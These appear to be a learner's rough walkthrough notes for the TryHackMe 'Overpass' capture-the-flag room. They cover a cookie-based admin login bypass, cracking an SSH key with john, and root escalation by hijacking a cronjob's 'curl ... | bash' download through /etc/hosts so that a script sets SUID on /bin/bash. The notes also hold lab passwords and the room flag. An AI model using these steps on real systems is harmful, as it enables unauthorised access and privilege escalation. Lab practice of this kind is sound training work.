[https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass)
 
22 ssh  
80 http
 
/downloads  
/img  
/admin  
/admin.html  
/aboutus  
/css  
/**http%3A%2F%2Fwww  
/**http%3A%2F%2Fad
 
Get downloads
 
look at login page source, login.js  
It mentions a cookie for login
 
Curl [http://10.10.225.254/admin/](http://10.10.225.254/admin/) --cookie "SessionToken=anything"  
*READ REPLY*
 
or, go to console of webpage:  
Type:  
Cookies.set("SessionToken","anything")  
Refresh page
 
Chmod 600 id_rsa  
Ssh -I id_rsa james@ip
 
Python /opt/john/ssh2john.py id_rsa > forjohn.txt  
John forjohn.txt --wordlist=rockyou.txt
 
Ls -la
 
Cat .overpass
 
[{"name":"System","pass":"saydrawnlyingpicture"}]
 
Linpeash.sh
 
***** Curl overpass.thm/downloads/src/buildscripts.sh | bash
 
There is a cronjob using the overpass.thm server  
We can write to /etc/hosts  
Change the ip addr in /etc/hosts for overpass.thm to attacker ip  
(Ip a s tun0)  
mkdir -p www/downloads/src/ (on attacker machine)  
Nano buildscript.sh
 
'''  
#!/bin/bash
 
Chmod +s /bin/bash  
'''
 
On target machine:  
Watch ls -la /bin/bash
 
Sudo python3 -m http.server 80
 
/bin/bash -p
 
Cat /root/root.txt
 
(doesn’t work on THM attack machine bc port 80 is in use)
 
thm{7f336f8c359dbac18d54fdd64ea753bb}
            

10.10.166.199
 
22  
80
 
Paradox  
James:james13